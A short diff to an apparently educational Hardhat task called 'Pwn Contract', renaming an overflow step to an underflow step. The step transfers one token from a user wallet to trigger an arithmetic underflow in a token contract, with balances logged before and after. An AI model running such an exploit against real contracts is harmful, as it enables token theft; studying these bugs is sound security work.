@@ -33,9 +33,9 @@ task(TASK_PWN, 'Pwn Contract')
     const startingTokens: BigNumber = await contract.balanceOf(userWallet.address);
     console.log(`Starting Tokens: ${startingTokens}`);
 
-    // Cause Overflow
-    const overflowAmt: BigNumber = hre.ethers.BigNumber.from('1');
-    await contract.connect(userWallet).transfer(deployerAddress, overflowAmt);
+    // Cause Underflow
+    const underflowAmt: BigNumber = hre.ethers.BigNumber.from('1');
+    await contract.connect(userWallet).transfer(deployerAddress, underflowAmt);
 
     const endingTokens: BigNumber = await contract.balanceOf(userWallet.address);
     console.log(`Ending Tokens: ${endingTokens}`);
